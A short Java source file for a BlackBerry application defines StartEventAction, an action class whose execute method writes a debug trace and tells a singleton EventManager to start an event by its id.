package blackberry.action;

import blackberry.EventManager;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class StartEventAction extends EventAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("StartEventAction",
            DebugLevel.VERBOSE);
    //#endif
    public StartEventAction(ConfAction params) {
        super( params);
    }

    public boolean execute(Trigger trigger) {
        //#ifdef DEBUG
        debug.trace("execute: "+eventId);
        //#endif

        final EventManager eventManager = EventManager.getInstance();

        eventManager.start(Integer.toString(eventId));
        return true;
    }

}
